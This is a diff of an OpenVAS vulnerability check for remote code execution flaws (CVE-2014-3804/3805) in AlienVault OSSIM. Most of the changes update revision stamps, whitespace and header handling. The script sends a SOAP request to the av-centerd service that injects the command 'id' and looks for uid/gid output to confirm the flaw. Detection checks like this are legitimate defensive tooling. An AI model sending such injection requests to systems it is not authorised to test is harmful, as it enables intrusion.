@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ossim_67999.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_ossim_67999.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # AlienVault OSSIM  Multiple Unspecified Remote Code Execution Vulnerabilities
 #
@@ -27,21 +27,21 @@
 
 CPE = "cpe:/a:alienvault:open_source_security_information_management";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105048");
   script_bugtraq_id(67999, 67998);
   script_cve_id("CVE-2014-3804", "CVE-2014-3805");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11222 $");
 
   script_name("AlienVault OSSIM  Multiple Remote Code Execution Vulnerabilities");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67999");
   script_xref(name:"URL", value:"http://www.alienvault.com/");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-06-20 12:08:51 +0200 (Fri, 20 Jun 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -63,7 +63,7 @@ if (description)
 
   script_tag(name:"qod_type", value:"remote_app");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
@@ -76,8 +76,9 @@ if( ! dir = get_app_location( cpe:CPE, port:wport ) ) exit( 0 );
 port = 40007;
 if( ! get_port_state( port ) ) exit( 0 );
 
-host = http_host_name(port:port);
+useragent = get_http_user_agent();
 cmd = 'id';
+host = http_host_name(port:port);
 
 soap = "<soap:Envelope soap:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' " +
        "xmlns:soapenc='http://schemas.xmlsoap.org/soap/encoding/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>" +
@@ -89,15 +90,13 @@ soap = "<soap:Envelope soap:encodingStyle='http://schemas.xmlsoap.org/soap/encod
 len = strlen( soap );
 
 req = 'POST /av-centerd HTTP/1.1\r\n' +
-      'Host: ' + host + ':' + port + '\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT  + '\r\n' +
+      'Host: ' + host + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'SOAPAction: "AV/CC/Util#update_system_info_debian_package"\r\n' +
       'Content-Type: text/xml; charset=UTF-8\r\n' +
       'Content-Length: ' + len + '\r\n' +
       '\r\n' +
       soap;
-
-
 buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
